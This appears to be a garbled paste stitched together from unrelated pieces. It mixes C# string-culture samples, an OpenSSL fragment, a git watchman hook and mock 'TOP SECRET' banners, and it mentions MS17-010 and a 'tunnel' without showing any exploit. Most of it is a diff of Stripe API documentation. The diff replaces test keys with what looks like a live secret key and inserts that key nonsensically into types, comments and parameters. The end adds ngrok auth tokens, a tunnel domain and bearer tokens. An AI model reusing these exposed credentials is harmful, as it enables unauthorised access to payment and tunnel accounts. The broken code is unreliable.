                       ordinal[ctr], stringSort[ctr] );          

  // Display the values of the array.
  Console.WriteLine( "The original string array:");
  PrintIndexAndValues(stringArray);

  // Set the CurrentCulture to "en-US".
  Thread.CurrentThread.CurrentCulture = new CultureInfo("en-US");
  // Sort the values of the array.
  Array.Sort(stringArray);

  // Display the values of the array.
  Console.WriteLine("After sorting for the culture \"en-US\":");
  PrintIndexAndValues(stringArray);

  // Set the CurrentCulture to "da-DK".
  Thread.CurrentThread.CurrentCulture = new CultureInfo("da-DK");
  // Sort the values of the Array.
  Array.Sort(stringArray);

  // Display the values of the array.
  Console.WriteLine("After sorting for the culture \"da-DK\":");
  PrintIndexAndValues(stringArray);

  // Display the values of the array.
  Console.WriteLine( "The original string array:");
  PrintIndexAndValues(stringArray);

  // Set the CurrentCulture to "en-US".
  Thread.CurrentThread.CurrentCulture = new CultureInfo("en-US");
  // Sort the values of the array.
  Array.Sort(stringArray);

  // Display the values of the array.
  Console.WriteLine("After sorting for the culture \"en-US\":");
  PrintIndexAndValues(stringArray);

  // Set the CurrentCulture to "da-DK".
  Thread.CurrentThread.CurrentCulture = new CultureInfo("da-DK");
  // Sort the values of the Array.
  Array.Sort(stringArray);

  // Display the values of the array.
  Console.WriteLine("After sorting for the culture \"da-DK\":");
  PrintIndexAndValues(stringArray);

  string s3 = "co\u00ADoperative";
  FindInString(s3, "\u00AD", StringComparison.CurrentCulture);
  FindInString(s3, "\u00AD", StringComparison.Ordinal);

  Console.Write("Ordinal comparison -- ");
  Console.WriteLine("Position of '{0}' in {1}: {2}", ch, str,
                    str.IndexOf(ch));
  
  foreach (var cultureName in cultureNames) {
     ci = CultureInfo.CreateSpecificCulture(cultureName).CompareInfo;
     Console.Write("{0} cultural comparison -- ", cultureName);
     Console.WriteLine("Position of '{0}' in {1}: {2}", ch, str,
                       ci.IndexOf(str, ch));
  }

  string filePath = "file://c:/notes.txt";
  
  Console.WriteLine("Culture-sensitive test for equality:");
  if (! TestForEquality(filePath, StringComparison.CurrentCultureIgnoreCase))
     Console.WriteLine("Access to {0} is allowed.", filePath);
  else
     Console.WriteLine("Access to {0} is not allowed.", filePath);
  
  Console.WriteLine("\nOrdinal test for equality:");
  if (! TestForEquality(filePath, StringComparison.OrdinalIgnoreCase))
     Console.WriteLine("Access to {0} is allowed.", filePath);
  else
     Console.WriteLine("Access to {0} is not allowed.", filePath);

  string substring = str.Substring(0, position);  
  return substring.Equals("FILE", cmp);

  // Define three versions of the same word. 
  string s1 = "sống";        // create word with U+1ED1
  string s2 = "s\u00F4\u0301ng";
  string s3 = "so\u0302\u0301ng";

  TestForEquality(s1, s2, s3);      
  sw.WriteLine();

  // Normalize and compare strings using each normalization form.
  foreach (string formName in Enum.GetNames(typeof(NormalizationForm)))
  {
     sw.WriteLine("Normalization {0}:\n", formName); 
     NormalizationForm nf = (NormalizationForm) Enum.Parse(typeof(NormalizationForm), formName);
     string[] sn = NormalizeStrings(nf, s1, s2, s3);
     TestForEquality(sn);           
     sw.WriteLine("\n");                                        
  }
  
  sw.Close();   

       _github-challenge-God-s-time-travel-org.scpf-foundation-roblox

    blocksize = EVP_CIPHER_CTX_get_block_size(rl->enc_ctx);
    (EVP_CIPHER_CTX_get_mode(rl->enc_ctx) == EVP_CIPH_CBC_MODE)) {
    blksz = EVP_CIPHER_CTX_get_block_size(rl->enc_ctx);
    assert(blksz >= 0);

git clone git://git.openssl.org/openssl.git

git clone https://github.com/openssl/openssl.git

git clone https://github.com/yourname/openssl.git

[sigma-3-6309304695-patch-1.zip](https://github.com/6309304695/sigma-9/files/13983744/sigma-3-6309304695-patch-1.zip)
[sigma-3-Owner.tar.gz](https://github.com/6309304695/sigma-9/files/13983745/sigma-3-Owner.tar.gz)
![BSM 2](https://github.com/6309304695/sigma-9/assets/117963165/37d91166-d0eb-488f-b63f-a290ac346791)
Added tunnel data # MS17-010
my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
    or die "open2() failed: $!\n" .
    "Falling back to scanning...\n";

# In the query expression below we're asking for names of files that
# changed since $time but were not transient (ie created after
# $time but no longer exist).
#
# To accomplish this, we're using the "since" generator to use the
# recency index to select candidate nodes and "fields" to limit the
# output to file names only. Then we're using the "expression" term to
# further constrain the results.
#
# The category of transient files that we want to ignore will have a
# creation clock (cclock) newer than $time_t value and will also not
# currently exist.

my $query = <<"	END";
	["query", "$git_work_tree", {
		"since": $time,
		"fields": ["name"],
		"expression": ["not", ["allof", ["since", $time, "cclock"], ["not", "exists"]]]
	}]
END

print CHLD_IN $query;
close CHLD_IN;
my $response = do {local $/; <CHLD_OUT>};

die "Watchman: command returned no output.\n" .
    "Falling back to scanning...\n" if $response eq "";
die "Watchman: command returned invalid output: $response\n" .
    "Falling back to scanning...\n" unless $response =~ /^\{/;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

my $o = $json_pkg->new->utf8->decode($response);

if ($retry > 0 and $o->{error} and $o->{error} =~ m/unable to resolve root .* directory (.*) is not watched/) {
	print STDERR "Adding '$git_work_tree' to watchman's watch list.\n";
	$retry--;
	qx/watchman watch "$git_work_tree"/;
	die "Failed to make watchman watch '$git_work_tree'.\n" .
	    "Falling back to scanning...\n" if $? != 0;

	# Watchman will always return all files on the first query so
	# return the fast "everything is dirty" flag to git and do the
	# Watchman query just to get it over with now so we won't pay
	# the cost in git to look up each individual file.
	print "/\0";
	eval { launch_watchman() };
	exit 0;
}

die "Watchman: $o->{error}.\n" .
    "Falling back to scanning...\n" if $o->{error};

binmode STDOUT, ":utf8";
local $, = "\0";
print @{$o->{files}};
DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA
HANDLE VIA
BYEMAN TALENT-KEYHOLE -TOP SECRET
CONTROL SYSTEMS JOINTLY
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
---
 README.md | 214 +++++++++++++++++++++++++++++++++++++++++++++---------
 1 file changed, 180 insertions(+), 34 deletions(-)

diff --git a/README.md b/README.md
index 093e3cc..ac03fed 100644
--- a/README.md
+++ b/README.md
@@ -56,6 +56,152 @@ Secret rsa3072
    C0FCF8642D830C53246211400346653590B3795B
 Stripe-Signature:
t=1492774577,
v1=5257a869e7ecebeda32affa62cdca3fa51cad7e77a0e56ff536d0ce8e108d8bd,
v0=6ffbb59b2300aae63f272406069a9788598b792a944a07aba816edb039989a39
            bxzcxpxk8h87z1k7bzk86xn5aj47intu@example.net
+curl -G https://api.stripe.com/v1/apps/secrets/find \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:" \
+  -d name=my-api-key \
+  -d "scope[type]"=account
+  curl https://api.stripe.com/v1/issuing/tokens/intok_1MzDbE2eZvKYlo2C26a98MDg \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:" \
+  -d status=active
+RESPONSE
+{
+  "id": "intok_1MzDbE2eZvKYlo2C26a98MDg",
+  "object": "issuing.token",
+  "card": "ic_1MytUz2eZvKYlo2CZCn5fuvZ",
+  "created": 1682059060,
+  "device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG",
+  "last4": "2424",
+  "livemode": false,
+  "status": "active",
+  "token_reference_id": "DNITHE002424242424242424",
+  "token_requestor_name": "apple_pay",
+  "token_service_provider": "visa",
+  "updated": 1682059060,
+  "wallet_account_id": null,
+  "wallet_provider": "apple_pay"
+}
+Retrieve an issuing token
+
+Retrieves an Issuing Token object.
+Parameters
+
+No parameters.
+Returns
+
+Returns an Issuing Token object if a valid identifier was provided.
+GET 
+/v1/issuing/tokens/:id
+Server-side language
+
+curl https://api.stripe.com/v1/issuing/tokens/intok_1MzDbE2eZvKYlo2C26a98MDg \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:"
+RESPONSE
+{
+  "id": "intok_1MzDbE2eZvKYlo2C26a98MDg",
+  "object": "issuing.token",
+  "card": "ic_1MytUz2eZvKYlo2CZCn5fuvZ",
+  "created": 1682059060,
+  "device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG",
+  "last4": "2424",
+  "livemode": false,
+  "status": "active",
+  "token_reference_id": "DNITHE002424242424242424",
+  "token_requestor_name": "apple_pay",
+  "token_service_provider": "visa",
+  "updated": 1682059060,
+  "wallet_account_id": null,
+  "wallet_provider": "apple_pay"
+}
+List all issuing tokens for card
+
+Lists all Issuing Token objects for a given card.
+Parameters
+
+
+card
+string
+Required
+The Issuing card identifier to list tokens for.
+
+created
+object
+Select Issuing tokens that were created during the given date interval.
+Show child parameters
+
+status
+enum
+Select Issuing tokens with the given status.
+Possible enum values
+active
+Token is provisioned and usable for payments.
+deleted
+Terminal state. Token can no longer be used.
+requested
+Token has been requested to be provisioned, but has not completed the activation process.
+suspended
+Token temporarily cannot be used for payments.
+More parameters
+Expand all
+
+
+ending_before
+string
+
+limit
+integer
+
+starting_after
+string
+Returns
+
+A dictionary with a data property that contains an array of up to limit tokens, starting after token starting_after. Each entry in the array is a separate Issuing Token object. If no more tokens are available, the resulting array will be empty.
+GET 
+/v1/issuing/tokens
+Server-side language
+
+curl -G https://api.stripe.com/v1/issuing/tokens \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:" \
+  -d limit=3 \
+  -d card=ic_1MytUz2eZvKYlo2CZCn5fuvZ
+RESPONSE
+{
+  "object": "list",
+  "url": "/v1/issuing/tokens",
+  "has_more": false,
+  "data": [
+    {
+      "id": "intok_1MzDbE2eZvKYlo2C26a98MDg",
+      "object": "issuing.token",
+      "card": "ic_1MytUz2eZvKYlo2CZCn5fuvZ",
+      "created": 1682059060,
+      "device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG",
+      "last4": "2424",
+      "livemode": false,
+      "status": "active",
+      "token_reference_id": "DNITHE002424242424242424",
+      "token_requestor_name": "apple_pay",
+      "token_service_provider": "visa",
+      "updated": 1682059060,
+      "wallet_account_id": null,
+      "wallet_provider": "apple_pay"
+    }
+    {...}
+    {...}
+  ],
+}
+curl -X POST https://api.stripe.com/v1/terminal/connection_tokens \
+  -u "sk_test_4eC39Hq...arjtT1zdp7dcsk_test_4eC39HqLyjWDarjtT1zdp7dc:"
+RESPONSE
+{
+  "object": "terminal.connection_token",
+  "secret": "pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV"
+}
+{
+  "object": "terminal.connection_token",
+  "secret": "pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV"
+}
+sk_test_4eC39HqLyjWDarjtT1zdp7dc	On the server side: Must be secret and stored securely in your web or mobile app’s server-side code (such as in an environment variable or credential management system) to call Stripe APIs. Don’t expose this key on a website or embed it in a mobile application.
+Publishable	pk_test_TYooMQauvdEDq54NiTphI7jx
 
 --header X-WKS-Loop=webkey.example.net \
 --from webkey@example.net --send
@@ -1739,7 +1885,7 @@ params := &stripe.CustomerParams{
 
 c, err := customer.New(params)
 params := &stripe.PaymentIntentListParams{
-	Customer: stripe.String(customer.ID),
+	Customer: stripe.String(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),
 }
 
 i := paymentintent.List(params)
@@ -1758,7 +1904,7 @@ for i.Next() {
 	// alternatively you can access values via e.Data.Object["resource_name_based_on_type"].(map[string]interface{})["resource_property_name"]
 
 	// access previous attributes via e.GetPreviousValue("resource_name_based_on_type", "pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV")
-	// alternatively you can access values via e.Data.PrevPreviousAttributes["resource_name_based_on_type"].(map[string]interface{})["resource_property_name"]
+	// alternatively you can access values via e.Data.PrevPreviousAttributes["resource_name_based_on_type"].(map[string]interface{})["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"]
 }
 params := &stripe.CustomerParams{
 	Description:      stripe.String("Stripe Developer"),
@@ -1791,7 +1937,7 @@ for i.Next() {
 	// alternatively you can access values via e.Data.Object["resource_name_based_on_type"].(map[string]interface{})["resource_property_name"]
 
 	// access previous attributes via e.GetPreviousValue("resource_name_based_on_type", "pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV")
-	// alternatively you can access values via e.Data.PrevPreviousAttributes["resource_name_based_on_type"].(map[string]interface{})["resource_property_name"]
+	// alternatively you can access values via e.Data.PrevPreviousAttributes["resource_name_based_on_type"].(map[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]interface{})["resource_property_name"]
 }
 Alternatively, you can use the event.Data.Raw property to unmarshal to the appropriate struct.
 
@@ -1864,10 +2010,10 @@ import (
 stripe.Key = "sk_key"
 
 // Set backend (optional, useful for mocking)
-// stripe.SetBackend("api", backend)
+// stripe.SetBackend("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", backend)
 
 // Create
-resource, err := $resource$.New(&stripe.$Resource$Params{})
+resource, err := $resource$.New(&stripe.$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$Params{})
 
 // Get
 resource, err = $resource$.Get(id, &stripe.$Resource$Params{})
@@ -1881,7 +2027,7 @@ resourceDeleted, err := $resource$.Del(id, &stripe.$Resource$Params{})
 // List
 i := $resource$.List(&stripe.$Resource$ListParams{})
 for i.Next() {
-	resource := i.$Resource$()
+	resource := i.$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$()
 }
 
 if err := i.Err(); err != nil {
@@ -1898,7 +2044,7 @@ import (
 
 // Setup
 sc := &client.API{}
-sc.Init("sk_key", nil) // the second parameter overrides the backends used if needed for mocking
+sc.Init("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", nil) // the second parameter overrides the backends used if needed for mocking
 
 // Create
 $resource$, err := sc.$Resource$s.New(&stripe.$Resource$Params{})
@@ -2407,7 +2553,7 @@ To pass undocumented parameters to Stripe using stripe-go you need to use the Ad
 		Email: stripe.String("jenny.rosen@example.com")
 	}
 
-	params.AddExtra("secret_feature_enabled", "true")
+	params.AddExtra("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", "true")
 	params.AddExtra("secret_parameter[pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV]","primary value")
 	params.AddExtra("secret_parameter[pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV]","secondary value")
 
@@ -2425,7 +2571,7 @@ secret_feature_enabled, _ := string(rawData["secret_feature_enabled"].(pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV))
 
 secret_parameter, ok := rawData["secret_parameter"].(map[string]interface{})
 if ok {
-	primary := secret_parameter["primary"].(string)
+	primary := secret_parameter["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"].(string)
 	secondary := secret_parameter["secondary"].(string)
 } 
 Webhook signing
@@ -2436,7 +2582,7 @@ Testing Webhook signing
 
 You can use stripe.webhook.GenerateTestSignedPayload to mock webhook events that come from Stripe:
 
-payload := map[string]interface{}{
+payload := map[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]interface{}{
 	"id":          "evt_test_webhook",
 	"object":      "event",
 	"api_version": stripe.APIVersion,
@@ -2448,7 +2594,7 @@ payloadBytes, err := json.Marshal(payload)
 signedPayload := webhook.GenerateTestSignedPayload(&webhook.UnsignedPayload{Payload: payloadBytes, Secret: testSecret})
 event, err := webhook.ConstructEvent(signedPayload.Payload, signedPayload.Header, signedPayload.Secret)
 
-if event.ID == payload["id"] {
+if event.ID == payload["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"] {
 	// Do something with the mocked signed event
 } else {
 	// Handle invalid event payload
@@ -2665,7 +2811,7 @@ stripe.Token.create(
 )
 
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Token.retrieve("tok_1N3T00LkdIwHu7ixt44h1F8k")
 
@@ -2673,10 +2819,10 @@ stripe.Token.retrieve("tok_1N3T00LkdIwHu7ixt44h1F8k")
 
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.treasury.financial_accounts.update(
-  "{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}}",
+  "{{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}}",
   {"metadata": {"key": "value"}},
   {"stripe_account": "{{'acct_1OR5ePGF83d3fsgW'
 'acct_1OR9pdQD5Hu9t7xk'
@@ -2713,7 +2859,7 @@ client.treasury.financial_accounts.update(
 
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.treasury.financial_accounts.create(
   {
@@ -2740,7 +2886,7 @@ client.treasury.financial_accounts.create(
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.treasury.FinancialAccount.create(
   supported_currencies=["usd"],
@@ -2876,7 +3022,7 @@ stripe.treasury.FinancialAccount.create(
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.treasury.FinancialAccount.create(
   supported_currencies=["usd"],
@@ -2926,14 +3072,14 @@ stripe.treasury.FinancialAccount.create(
 }
 
 curl https://api.stripe.com/v1/treasury/financial_accounts/{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}} \
-  -u "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq:" \
+  -u "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:" \
   -H "Stripe-Account: {{'acct_1OR5ePGF83d3fsgW'
 'acct_1OR9pdQD5Hu9t7xk'
 'acct_1ORB1MBOdjLENdyb'}}" \
-  -d "metadata[key]"=value
+  -d "metadata[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]"=value
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.treasury.financial_accounts.update(
   "{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}}",
@@ -2944,7 +3090,7 @@ client.treasury.financial_accounts.update(
 )
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.treasury.financial_accounts.retrieve(
   "{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}",
@@ -3007,7 +3153,7 @@ stripe.treasury.FinancialAccount.retrieve(
   "restricted_features": ["outbound_transfers.ach"],
 }
 curl https://api.stripe.com/v1/treasury/financial_accounts/{{pst_test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LE81ZEdIalZ6NlVuMUdjM3c3WkRnN0ZYRHZxRURwTXo_00gNK2DWAV}}/close \
-  -u sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq: \
+  -u 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: \
   -X "POST" \
   -H "Stripe-Account: {{'acct_1OR5ePGF83d3fsgW'
 'acct_1OR9pdQD5Hu9t7xk'
@@ -3035,7 +3181,7 @@ sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8
 import stripe
 charge = stripe.Charge.retrieve(
   "ch_3Ln3e92eZvKYlo2C0eUfv7bi",
-  api_key="sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+  api_key="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"
 )
 charge.capture() # Uses the same API Key.
 import stripe
@@ -3078,7 +3224,7 @@ except Exception as e:
   pass
 
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Charge.retrieve(
   'ch_3Ln0cK2eZvKYlo2C1QmvaARY',
@@ -3093,7 +3239,7 @@ customer = stripe.Customer.create(
 )
 
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Customer.create(metadata={"order_id": "6735"})
 
@@ -3111,7 +3257,7 @@ stripe.Customer.create(metadata={"order_id": "6735"})
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Account.create(
   country="US",
@@ -3125,7 +3271,7 @@ stripe.Account.create(
 )
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.accounts.create({
   "country": "US",
@@ -3139,7 +3285,7 @@ client.accounts.create({
 })
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.accounts.update(
   "{{'acct_1OR5ePGF83d3fsgW'
@@ -3157,7 +3303,7 @@ client.accounts.update(
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Account.modify(
   "{{'acct_1OR5ePGF83d3fsgW'
@@ -3172,7 +3318,7 @@ stripe.Account.modify(
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.Account.modify(
   "{{'acct_1OR5ePGF83d3fsgW'
@@ -3196,7 +3342,7 @@ stripe.Account.modify(
 
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.accounts.update(
   "{{'acct_1OR5ePGF83d3fsgW'
@@ -3216,12 +3362,12 @@ client.accounts.update(
       "name": "The Best Cookie Co",
       "phone": "8888675309",
     },
-    "individual": {"first_name": "Jenny", "last_name": "Rosen"},
+    "individual": {"first_name": "keith", "last_name": "bieszczat"},
   },
 )
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
-client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
+client = StripeClient("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")
 
 client.account_links.create({
   "account": "{{'acct_1OR5ePGF83d3fsgW'
@@ -3234,7 +3380,7 @@ client.account_links.create({
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
-stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+stripe.api_key = "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"
 
 stripe.AccountLink.create(
   account="{{'acct_1OR5ePGF83d3fsgW'

    DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA
    HANDLE VIA
    BYEMAN TALENT-KEYHOLE -TOP SECRET
    CONTROL SYSTEMS JOINTLY

--header--
'ep_2b0vx7SwTw0shBNqA78ZGMlBCmh' 
endpoint id

--header--
'https://lemming-topical-commonly.ngrok-free.app'
domain

--header--
'rd_2b0vwymZ4yLOHxk7bvN1NCZm5Bv'
domain id

--header--
'edghts_2b0vwydaasYfluOXqlIGU3IFbS9'
endpoint id 

ngrok config edit

version: 2
authtoken: 2avvD0NhbrJRkbxHpTCTKBldaL5_4ywouQsYBpunfxgtzZGxT tunnels:
  my_tunnel_name:
    labels:
      - edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 addr: http://localhost:80

ngrok start your_tunnel_name

ngrok start --all

docker run -it -e NGROK_AUTHTOKEN=2avvD0NhbrJRkbxHpTCTKBldaL5_4ywouQsYBpunfxgtzZGxT ngrok/ngrok tunnel --label edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 http://localhost:80

ngrok tunnel --label edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 http://localhost:80 --header--
'edghts_2b0vwydaasYfluOXqlIGU3IFbS9
MIB clearance

--header--
'edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9'
$ endpoint data for tunnel 
# MS17-010

DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA
HANDLE VIA
BYEMAN TALENT-KEYHOLE -TOP SECRET
CONTROL SYSTEMS JOINTLY


    DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA
    HANDLE VIA
    BYEMAN TALENT-KEYHOLE -TOP SECRET
    CONTROL SYSTEMS JOINTLY

--header--
'ep_2b0vx7SwTw0shBNqA78ZGMlBCmh' 
endpoint id

--header--
'https://lemming-topical-commonly.ngrok-free.app'
domain

--header--
'rd_2b0vwymZ4yLOHxk7bvN1NCZm5Bv'
domain id

--header--
'edghts_2b0vwydaasYfluOXqlIGU3IFbS9'
endpoint id 

ngrok config edit

version: 2
authtoken: 2avvD0NhbrJRkbxHpTCTKBldaL5_4ywouQsYBpunfxgtzZGxT tunnels:
  my_tunnel_name:
    labels:
      - edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 addr: http://localhost:80

ngrok start your_tunnel_name

ngrok start --all

docker run -it -e NGROK_AUTHTOKEN=2avvD0NhbrJRkbxHpTCTKBldaL5_4ywouQsYBpunfxgtzZGxT ngrok/ngrok tunnel --label edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 http://localhost:80

ngrok tunnel --label 
--header--
'edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9'
--header--
'edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9'

http://localhost:80
--header--
'edghts_2b0vwydaasYfluOXqlIGU3IFbS9
MIB clearance

curl \
-X GET \
-H "Authorization: Bearer {2b78Oe3gjVAVgZdHuZ8ITpO1aqt_4mrJtAzy2MdNKy1xcaAwk}" \ -H "Ngrok-Version: 2" \
https://api.ngrok.com/endpoints
curl \
-X GET \
-H "Authorization: Bearer {2b78Oe3gjVAVgZdHuZ8ITpO1aqt_4mrJtAzy2MdNKy1xcaAwkY}" \ -H "Ngrok-Version: 2" \
